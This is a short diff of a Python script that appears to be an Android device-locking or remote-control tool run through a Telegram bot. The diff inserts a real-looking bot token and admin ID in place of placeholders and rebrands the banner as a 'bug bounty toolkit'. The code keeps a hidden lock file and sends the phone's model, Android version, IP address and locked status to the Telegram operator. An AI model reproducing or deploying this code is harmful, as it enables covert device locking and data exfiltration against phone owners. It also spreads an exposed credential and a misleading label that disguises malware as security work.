@@ -10,52 +10,23 @@ import json
 import platform
 from datetime import datetime
 
-BOT_TOKEN = "7378131831:AAHx_xxxxxxxxxxxxx_your_token_here"
-ADMIN_ID = 123456789
+BOT_TOKEN = "8446333066:AAEm-oyToPd6qFLRy_PZEg0qUnqYzTrveVM"
+ADMIN_ID = 7415049540
 DEVICE_ID = ""
 LOCKED = False
 LOCK_FILE = "/data/local/tmp/.nusan_lock"
 
 ASCII_LOGO = """
-           dNNMMMNNc
-         KNMMMMMMMMMWx
-        OMMMMMMMMMMMMWd
-       .MMMMMMMMMMMMMMW
-        MMMMMMMMMMMMMMN
-        ;MMMMMMMMMMMMM.
-          0MMMMMMMMMo
-      ,WWWWWWX
-    dWWMX  ;MMW
-   0WMW.NWWN0.Mc
-  cMMMX.MMMMMN.'
- .WMMMMX.MMMMMNc
- kMMMMMMN,xMMMMWN
-.MMMMMMMMWd'MMMMMN,
-oMMMMMMMMMWX.XMMMMWWX
-OMMMMMMMMMMMN cMMMMMMWWWW. NMO
-KMMMMMMMMMMMo   .MMMMMMMMMWNN. N'
-KMMMMMMMMMMM,        NMMMMMMMWNk::xx
-KMMMMMMMMMMM.      kWNN: kMMMMMO:X.MWWN
-oMMMMMMMMMMM.      oMMMMWWN;   KM0  MMMW.
- KMMMMMMMMMM,       KMMMMMMMWWWMW   cMMMO
-  .MMMMMMMMMWW.      .MMMMMMMMM:     WMMM.
-      dMMMMMMMMMNx        NWWWWWWX   .MMMN'
-        0MMMMMMMMMNo     ;Wx  .MMMMWN:
-         .MMMMMMMMMMW    d.XWWNcdMMMMWWW.
-           .MMMMMMMMMx    ;MMMMckMMMMMMMMWWWW0.
-            .MMMMMMMM,    kMMMM.WMMMMMMMMMMMMMWWWWWWW:
-            oMMMMMMMW     WMMMK,MMMMMMMMMMMMMMMMMMMMMWo
-            NMMMMMMMd    ,MMMM;kMMllMMMMMMMMMMMMMMMMMMx
-           ;MMMMMMMM'    kMMMM.WMc       NMMMMMMMMMMMM.
-           OMMMMMMMN     WMMMk             lMMMMMMMMM.
-          .WMMMMMMMl    :MMMM,           NWWMMMMMMMO
-          lMMMMMMMM.    0MMMW         ,WWMMMMMMMMl
-          KMMMMMMMO    .MMMMx       cWWMMMMMMMM'
-         'MMMMMMMM,    cMMMM'     KWWMMMMMMMWll:ccc:::;,
-         xMMMMMMMW     KMMMN    kWMMMMMMMMMMMMMMMMMMMMMMMWO
-         lMMMMMMMo    .MMMMo    WMMMMMMMMMMMMMMMMMMMMMMMMMM
-           MMMMM       KMMN      MMMMMMMMMMMMMMMMMMMMMMMMW
-                        .,        .WMMMMMMMMMMMMMMMMMMMM.
+╔═══════════════════════════════════════════╗
+║    ███╗   ██╗██╗   ██╗███████╗ █████╗     ║
+║    ████╗  ██║██║   ██║██╔════╝██╔══██╗    ║
+║    ██╔██╗ ██║██║   ██║███████╗███████║    ║
+║    ██║╚██╗██║██║   ██║╚════██║██╔══██║    ║
+║    ██║ ╚████║╚██████╔╝███████║██║  ██║    ║
+║    ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ║
+║          X S P A C E   V 3 . 0             ║
+║         BUG BOUNTY TOOLKIT                  ║
+╚═══════════════════════════════════════════╝
 """
 
 MENU = """
@@ -166,7 +137,7 @@ def process_command(text):
 ║ Model     : {info['phone_model']}
 ║ Android   : {info['android_version']}
 ║ IP        : {info['ip_address']}
-║ Status    : {'TERKUNCI 🔒' if LOCKED else 'BEBAS 🔓'}
+║ Status    : {'🔒 TERKUNCI' if LOCKED else '🔓 BEBAS'}
 ╚══════════════════════════════╝
         """
         send_to_telegram(msg)
